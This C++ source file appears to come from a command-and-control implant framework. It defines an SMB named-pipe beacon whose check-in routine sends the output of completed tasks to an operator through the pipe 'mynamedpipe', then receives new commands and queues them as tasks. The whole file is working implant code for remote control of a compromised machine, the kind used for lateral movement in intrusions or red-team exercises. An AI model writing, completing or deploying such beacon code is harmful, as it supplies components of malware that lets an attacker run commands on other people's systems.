#include "BeaconSmb.hpp"

using namespace std;
using namespace PipeHandler;


BeaconSmb::BeaconSmb(std::string& ip, int port)
	: Beacon(ip, port)
{
	std::string pipeName = "mynamedpipe";
	m_clientSmb = new PipeHandler::Client(pipeName);
}


BeaconSmb::~BeaconSmb()
{
	delete m_clientSmb;
}


void BeaconSmb::checkIn()
{
	std::string output;
	taskResultsToCmd(output);

	DEBUG("sending output.size " << std::to_string(output.size()));

	m_clientSmb->sendData(output);

	DEBUG("sent");

	DEBUG("receiving");

	string input;
	m_clientSmb->receiveData(input);

	DEBUG("received input.size " << std::to_string(input.size()));

	if(!input.empty())
	{
		cmdToTasks(input);
	}
}

